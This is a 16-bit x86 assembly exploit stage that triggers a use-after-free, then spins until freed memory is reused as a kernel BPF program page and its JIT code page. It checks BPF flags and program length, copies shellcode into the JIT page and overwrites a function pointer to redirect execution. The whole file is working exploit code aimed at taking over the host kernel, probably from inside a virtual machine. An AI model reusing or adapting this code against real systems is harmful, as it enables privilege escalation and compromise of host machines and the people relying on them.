BITS 16

; trigger UAF
mov [0x2000], si    	; JIT (0x2000)
mov [0x1000], si	 	; BPF (0x1000)

; we should hopefully have the BPF page here soon, busyloop until we do
.wait:
	cmp byte [di], 0
	je .wait

; Do some additional checks to verify that we are in fact at the BPF page
; 1) Check bpf size = 1 page.
cmp word[0x1000], 1
jne .wait

; flags
cmp word[0x1002], 0x23 ; blinded + jit
je .bflaggood
cmp word[0x1002], 0x3  ; jit
je .bflaggood
jmp .wait

.bflaggood:
; 2) Check BPF type.
cmp word [0x1004], 0
jne .wait

; 3) Check expected BPF prog length (changes between kernels).
cmp word [0x1010], 0x2D
jne .wait

; Wait until second page (JIT) is filled as well.
.wait2:
	cmp byte [0x2000], 0
	je .wait2

; Last check: shellcode page should almost always have \xCC at +5.
cmp byte [0x2005], 0xCC
jne .bail5

; Copy over shellcode.
mov si, 0x6000
mov di, 0x2010
mov cx, 0x40
repne movsb

; Fix function pointer.
mov ax, word [0x1030]
and ax, 0xF000
add ax, 0x10
mov word [0x1030], ax

; Quit
ud2

.bail:
ud2
.bail2:
ud2
.bail3:
ud2
.bail4:
ud2
.bail5:
ud2
